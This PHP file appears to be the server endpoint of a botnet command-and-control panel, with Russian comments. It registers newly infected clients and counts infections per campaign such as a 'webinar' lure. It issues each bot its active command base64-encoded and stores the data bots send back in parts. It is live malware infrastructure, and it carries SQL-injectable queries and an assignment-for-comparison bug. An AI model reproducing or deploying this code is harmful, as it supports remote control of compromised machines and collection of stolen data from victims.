<?php

include ("/home/user-data/www/default/admin/cc/bd.php");
mysqli_set_charset($link, "utf8");

$cl = $_GET['i'];
$client_id = mysqli_real_escape_string($link, $_GET['i']);
$command_id = mysqli_real_escape_string($link, $_GET['cid']);
$part_id = mysqli_real_escape_string($link, $_GET['p']);
$data = mysqli_real_escape_string($link, $_GET['d']);
$final_part = mysqli_real_escape_string($link, $_GET['fin']);
$attack_name = mysqli_real_escape_string($link, $_GET['name']);
if($attack_name == 'webinar'){
	$attack_name = 'Вебинар';
}

$data = str_replace(" ","+",$data);


$result = mysqli_query($link,"INSERT INTO timelog(client_id, command_id,time) VALUES ('$client_id','$command_id',now()) ");

if (isset ($client_id) && isset($command_id) && isset($part_id) && isset($data)) 
{

$result = mysqli_query($link,"INSERT INTO replies (client_id,command_id,part_id,data) VALUES('$client_id','$command_id','$part_id','$data')");
if ($result == 'true') {
	//echo "<p>ok</p>";
}}
else {
	//echo "<p>ne ok</p>";
}	
	if (isset ($final_part))
	{
		$result = mysqli_query ($link,"UPDATE tasks SET status='2' WHERE id =".$command_id."");
		$result = mysqli_query ($link,"UPDATE tasks SET active_flag='0' WHERE id =".$command_id."");
		
	}
	else
	{
		$result = mysqli_query ($link,"UPDATE tasks SET status='1' WHERE id =".$command_id."");
	}
	



//бот пришел за командой.
if (!empty ($cl) &&  $command_id="woot") 
{
	//новый ли клиент?
	$task_cnt= mysqli_query ($link,"SELECT * FROM tasks where client_id = '".$client_id."'");
	if(mysqli_num_rows($task_cnt) == 0)
	{
	//если с таким $client_id еще никого не было раньше, добавляем с таском init
	$result = mysqli_query ($link,"INSERT INTO tasks(client_id, active_flag,operation,argument,argument_human,status) VALUES ('$client_id',1,'init','','',0) ");
	$result1 = mysqli_query ($link, "SELECT * FROM attacks_stats WHERE attack_name = '$attack_name'");
      while ($row = mysqli_fetch_array($result1, MYSQLI_NUM)){
        $count = $row[1];
        $new_count = $count + 1;
      $result2 = mysqli_query ($link, "UPDATE attacks_stats SET count = '$new_count' WHERE attack_name = '$attack_name'");     
      }
    
	}
	
	//едем дальше, боту нужно отдать активную команду.
	$query = mysqli_query($link,"SELECT id, operation, argument_human from tasks where client_id = '".$client_id."' AND active_flag='1'");
	$row = mysqli_fetch_array($query,MYSQLI_NUM);
	if(!$row[0])
	{
		echo("0 idle ZW1wdHkK");
	}
	else
	{
		echo("".$row[0]." ".$row[1]." ".base64_encode($row[2])."");
	}
	//if ($result == 'true') {echo "<p>ok</p>";} 
	//else {echo "<p>ne ok</p>";}
}
else
{
	echo "<p>missing parametrs</p>";
}
		 

?>
